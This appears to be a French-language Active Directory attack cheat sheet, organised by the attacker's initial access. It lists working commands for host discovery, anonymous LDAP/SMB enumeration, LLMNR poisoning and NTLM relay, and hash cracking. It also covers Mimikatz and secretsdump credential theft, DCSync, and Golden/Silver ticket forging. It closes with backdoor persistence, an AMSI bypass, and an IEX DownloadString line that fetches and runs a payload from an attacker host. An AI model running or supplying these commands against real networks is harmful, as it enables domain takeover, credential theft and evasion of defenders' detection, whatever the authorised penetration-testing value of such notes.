# A. Approches selon le Niveau d'Accès Initial

Cette section détaille les stratégies d'attaque Active Directory en fonction du niveau d'accès initial dont dispose l'attaquant.

## I. Sans Credentials (Accès Externe ou Non Authentifié sur le Réseau Interne)

### 1. Découverte Réseau et Énumération Initiale
*   **Objectif :** Identifier les hôtes actifs, en particulier les Contrôleurs de Domaine (DC).
*   **Commandes Clés :**
    ```bash
    # Découverte d'hôtes actifs (rapide)
    fping -asgq 192.168.1.0/24
    nmap -sn 192.168.1.0/24

    # Identification des DCs via ports standards AD (LDAP, Kerberos, SMB, DNS)
    nmap -p 53,88,389,445,464,636,3268,3269 --open 192.168.1.0/24 -oG - | grep "/open/"
    ```

### 2. Exploitation des Services Anonymes/Non Authentifiés
*   **Objectif :** Recueillir des informations sur le domaine, les utilisateurs, les partages, etc., sans authentification.

    *   **LDAP Anonyme :**
        ```bash
        # Vérifier l'accès anonyme et lister tout (si autorisé)
        ldapsearch -x -h <IP_DC> -p 389 -b "dc=domain,dc=local" -s sub "(objectclass=*)"

        # Informations de base sur le domaine (Naming Contexts, etc.)
        ldapsearch -x -h <IP_DC> -p 389 -b "" -s base "(objectclass=*)" namingContexts
        ```
        *   **À chercher :** Noms d'utilisateurs, descriptions, groupes, structure de l'OU.

    *   **SMB Anonyme (Null Session) :**
        ```bash
        # Lister les partages
        smbclient -N -L //<IP_CIBLE>
        smbmap -H <IP_CIBLE> -u '' -p '' # ou -u guest -p ''

        # Accéder aux partages (ex: SYSVOL, NETLOGON)
        smbclient -N //<IP_CIBLE>/SYSVOL
        # Chercher : Scripts de connexion (GPO), fichiers de configuration (XML avec passwords).
        ```

### 3. Empoisonnement LLMNR/NBT-NS et Relais NTLM
*   **Objectif :** Intercepter les hashes Net-NTLM ou relayer des authentifications.
*   **Outils :** Responder, ntlmrelayx.py
*   **Commandes Clés :**
    ```bash
    # 1. Lancement de Responder (écouter les requêtes LLMNR/NBT-NS)
    sudo responder -I <interface_reseau> -wfv 
    # -w: Démarrer le serveur WPAD malveillant
    # -f: Permettre l'empreinte du système d'exploitation distant
    # -v: Verbose

    # 2. Craquage des hashes Net-NTLMv1/v2 capturés (stockés dans logs/):
    hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

    # 3. Relais NTLM (plus avancé, nécessite une cible pour relayer)
    # Relais vers SMB (exécution de commande, dump SAM)
    sudo ntlmrelayx.py -t smb://<IP_CIBLE_RELAY> -smb2support (-c "commande" ou -i pour interactif)
    # Relais vers LDAP/S (ajout d'utilisateur, modification de groupe, RBCD, Shadow Credentials)
    sudo ntlmrelayx.py -t ldaps://<IP_DC> --delegate-access # Tente d'ajouter un nouveau compte machine et de configurer RBCD
    sudo ntlmrelayx.py -t ldaps://<IP_DC> --add-computer # Ajoute un compte machine
    sudo ntlmrelayx.py -t ldaps://<IP_DC> --escalate-user <UTILISATEUR_A_ESCALADER> # Tente d'ajouter l'utilisateur à Domain Admins
    ```
    *   **Attention :** Le relais NTLM est une technique active et potentiellement disruptive.

### 4. Exploitation des Services Web Exposés
*   **Objectif :** Trouver des vulnérabilités sur les applications web internes (OWA, SharePoint, applications custom) pouvant mener à un accès ou à la fuite d'informations.
*   **Commandes Clés :**
    ```bash
    # Découverte de services web
    nmap -p 80,443,8000,8080,8443 --open <PLAGE_IP> -sV

    # Fuzzing de sous-domaines (si un domaine interne est connu)
    wfuzz -u http://<domaine.local> -H "Host: FUZZ.<domaine.local>" -w /path/to/subdomains.txt --hc 404 --hw <NB_MOTS_PAGE_ERREUR>
    ```
    *   **Chercher :** Pages de login, vulnérabilités (XSS, SQLi, LFI/RFI), informations sensibles dans le code source.

## II. Avec un Accès Initial (Assumed Breach / Compte Utilisateur Standard Compromis)

### 1. Énumération Post-Compromission (Contexte Utilisateur)
*   **Objectif :** Comprendre le contexte actuel, les droits, et identifier les prochaines cibles.
*   **Commandes Clés (Windows) :**
    ```powershell
    whoami /all             # Droits et groupes de l'utilisateur actuel
    hostname                # Nom de la machine
    ipconfig /all           # Configuration réseau, serveurs DNS (souvent DCs)
    nltest /dclist:<DOMAINE> # Lister les DCs du domaine
    systeminfo | findstr /B /C:"Domain" /C:"OS Name" /C:"OS Version" # Infos système et domaine

    # PowerView (si disponible/uploadé)
    Import-Module .\PowerView.ps1
    Get-NetDomain           # Infos sur le domaine actuel
    Get-NetDomainController # Lister les DCs
    Get-DomainPolicyData | select -ExpandProperty SystemAccess # Politique de mot de passe
    Get-CurrentUserTokenGroupEnumerate # Groupes de l'utilisateur actuel
    ```

### 2. Recherche de Privilèges et Accès Locaux/Distants
*   **Objectif :** Identifier si l'utilisateur actuel a des droits d'admin local sur d'autres machines, ou si des sessions privilégiées sont accessibles.
*   **Commandes Clés (PowerView) :**
    ```powershell
    Find-LocalAdminAccess -Verbose             # Où l'utilisateur actuel est admin local
    Find-DomainUserLocation -ShowAll           # Où sont connectés les utilisateurs du domaine
    Find-DomainUserLocation -User <USER>       # Où est connecté un utilisateur spécifique
    Invoke-ShareFinder -Verbose                # Trouver les partages accessibles
    Invoke-FileFinder -Verbose                 # Trouver des fichiers sensibles sur les partages
    Get-NetLoggedon -ComputerName <CIBLE>      # Utilisateurs connectés sur une machine
    Get-NetSession -ComputerName <CIBLE>       # Sessions actives sur une machine
    ```

### 3. Énumération d'Utilisateurs et Groupes (Contextualisée)
*   **Objectif :** Identifier des utilisateurs/groupes d'intérêt pour l'élévation ou le mouvement latéral.
*   **Commandes Clés (PowerView) :**
    ```powershell
    Get-NetUser -UserName <USER> | fl *     # Détails d'un utilisateur
    Get-NetGroup -GroupName "Domain Admins" # Détails d'un groupe
    Get-NetGroupMember -GroupName "Domain Admins" # Membres d'un groupe
    Get-NetLocalGroupMember -ComputerName <CIBLE> -GroupName "Administrators" # Admins locaux d'une machine
    ```
*   **RPCClient (Linux, si accès SMB/RPC) :**
    ```bash
    # Session anonyme (si autorisée) ou avec credentials
    rpcclient -U "" -N <IP_DC_OU_CIBLE> # Anonyme
    rpcclient -U "DOMAINE\user%password" <IP_DC_OU_CIBLE>

    rpcclient $> enumdomusers        # Lister les utilisateurs du domaine
    rpcclient $> enumdomgroups       # Lister les groupes du domaine
    rpcclient $> queryuser <RID>     # Infos sur un utilisateur par RID
    rpcclient $> querygroup <RID>    # Infos sur un groupe par RID
    lookupsid.py 'anonymous:<MOT_DE_PASSE_VIDE_OU_QUELCONQUE>@<IP_CIBLE_OU_DC>' # Énumérer via SID Lookup
    ```

### 4. Vérification des Conventions de Nommage (pour générer des listes d'utilisateurs)
*   **Objectif :** Si des noms d'employés sont connus (OSINT), générer des noms d'utilisateurs potentiels.
*   **Exemple (Bash) :**
    ```bash
    # names.txt contient une liste de "prénom nom"
    while IFS= read -r fullname; do
      firstname=$(echo "$fullname" | awk '{print tolower($1)}')
      lastname=$(echo "$fullname" | awk '{print tolower($2)}')
      echo "${firstname}.${lastname}" # prenom.nom
      echo "${firstname:0:1}${lastname}" # pnom
      echo "${firstname}${lastname:0:1}" # prenoml
    done < names.txt > potential_users.txt
    ```

## III. Scénario Post-Exploitation (Accès Privilégié sur une Machine ou au Domaine)

### 1. Extraction de Credentials
*   **Objectif :** Obtenir des identifiants en clair, hashes, ou tickets Kerberos.
*   **Outils :** Mimikatz, secretsdump.py, Rubeus
*   **Commandes Clés :**
    *   **Mimikatz (Windows, nécessite des privilèges élevés) :**
        ```powershell
        # Charger Mimikatz
        Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' # Credentials en mémoire (LSASS)
        Invoke-Mimikatz -Command '"lsadump::sam"' # Hashes SAM locaux (nécessite accès SYSTEM)
        Invoke-Mimikatz -Command '"lsadump::lsa /patch"' # Secrets LSA (comptes de service, etc.)
        Invoke-Mimikatz -Command '"sekurlsa::tickets /export"' # Exporter les tickets Kerberos en mémoire
        ```
    *   **secretsdump.py (Linux, accès distant ou hives exportées) :**
        ```bash
        # Dump distant (nécessite admin local sur la cible)
        secretsdump.py <DOMAINE>/<USER>:<PASSWORD>@<IP_CIBLE>
        secretsdump.py -hashes <LM_HASH>:<NT_HASH> <DOMAINE>/<USER>@<IP_CIBLE> # Pass-the-Hash

        # Dump depuis les hives SAM/SYSTEM/SECURITY sauvegardées
        secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
        # Pour obtenir les hives:
        # reg save HKLM\SAM C:\sam.save
        # reg save HKLM\SYSTEM C:\system.save
        # reg save HKLM\SECURITY C:\security.save
        ```

### 2. Élévation de Privilèges via DCSync
*   **Objectif :** Obtenir les hashes de n'importe quel compte (y compris `krbtgt`) en imitant un DC.
*   **Prérequis :** Droits de réplication (`Replicating Directory Changes`, `Replicating Directory Changes All`). Souvent détenus par les Admins du Domaine, Contrôleurs de Domaine, ou comptes avec délégation spécifique.
*   **Vérification des droits (PowerView) :**
    ```powershell
    Get-ObjectAcl -SamAccountName "krbtgt" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') }
    # Ou pour le domaine entier
    Get-ObjectAcl "DC=<DOMAINE>,DC=<LOCAL>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') -and $_.IdentityReference -match "<UTILISATEUR_A_VERIFIER>" }
    ```
*   **Exécution :**
    *   **Mimikatz :**
        ```powershell
        # Obtenir le hash de krbtgt
        Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<DOMAINE.LOCAL> /user:krbtgt"'
        # Obtenir le hash d'un utilisateur spécifique
        Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<DOMAINE.LOCAL> /user:<UTILISATEUR_CIBLE>"'
        ```
    *   **secretsdump.py :**
        ```bash
        secretsdump.py -just-dc <DOMAINE>/<USER_AVEC_DROITS_DCSYNC>:<PASSWORD>@<IP_DC>
        secretsdump.py -just-dc-user <UTILISATEUR_CIBLE> <DOMAINE>/<USER_AVEC_DROITS_DCSYNC>:<PASSWORD>@<IP_DC>
        ```

### 3. Création de Golden/Silver Tickets (Persistance et Accès)
*   **Objectif :** Forger des tickets Kerberos pour un accès durable et étendu.
*   **Prérequis :**
    *   **Golden Ticket :** Hash NTLM du compte `krbtgt`, SID du domaine.
    *   **Silver Ticket :** Hash NTLM du compte de service (ordinateur ou utilisateur), SID du domaine, SPN du service cible.
*   **Commandes Clés (Mimikatz) :**
    ```powershell
    # Golden Ticket (accès total au domaine)
    # Variables: $Domain, $DomainSID, $KrbTgtHash, $UserToImpersonate, $UserID (optionnel, 500 pour admin)
    Invoke-Mimikatz -Command '"kerberos::golden /domain:<DOMAINE.LOCAL> /sid:<SID_DOMAINE> /rc4:<HASH_NTLM_KRBTGT> /user:FakeAdmin /id:500 /ptt"'
    # /ptt : Injecte le ticket dans la session actuelle

    # Silver Ticket (accès à un service spécifique sur une machine)
    # Variables: $Domain, $DomainSID, $ServiceAccountHash, $UserToImpersonate, $TargetServerFQDN, $ServiceSPN (e.g., cifs, http, host)
    Invoke-Mimikatz -Command '"kerberos::golden /domain:<DOMAINE.LOCAL> /sid:<SID_DOMAINE> /rc4:<HASH_NTLM_COMPTE_SERVICE> /user:FakeAdmin /service:<SERVICE> /target:<SERVEUR.DOMAINE.LOCAL> /ptt"'
    # Exemple service: cifs, target: dc01.domaine.local
    ```

### 4. Persistance
*   **Objectif :** Maintenir l'accès après compromission.
*   **Quelques Techniques :**
    *   **Ajout aux groupes privilégiés :**
        ```powershell
        Add-DomainGroupMember -Identity 'Domain Admins' -Members 'utilisateur_backdoor'
        ```
    *   **Golden/Silver Tickets (déjà mentionné).**
    *   **ACLs sur objets AD :** Donner des droits DCSync à un compte contrôlé.
    *   **Comptes machine avec délégation :**
        ```powershell
        # Créer un compte machine
        New-MachineAccount -MachineAccount "PERSIST$" -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
        # Configurer délégation (exemple: non contrainte, risqué)
        Set-ADComputer -Identity "PERSIST$" -TrustedForDelegation $true
        ```
    *   **Scheduled Tasks, services malveillants, WMI event subscriptions, etc.** (techniques de persistance Windows classiques).

### 5. Évasion des Détections (Considérations)
*   **Objectif :** Minimiser les traces et éviter la détection par les EDR/SIEM.
*   **Quelques Techniques :**
    *   **Contournement AMSI (Anti-Malware Scan Interface) pour PowerShell :**
        ```powershell
        # Diverses méthodes existent, souvent obfusquées. Exemple simple (peut être détecté) :
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        ```
    *   **Exécution en mémoire (évite d'écrire sur le disque) :**
        ```powershell
        IEX (New-Object Net.WebClient).DownloadString('http://<IP_ATTAQUANT>/payload.ps1')
        ```
    *   **Utilisation de canaux de communication alternatifs (C2) :** DNS, ICMP, DoH.
    *   **Chiffrement du trafic C2.**
    *   **Modification des timestamps des fichiers (timestomping).**
    *   **Désactivation/altération des logs (risqué et bruyant).** 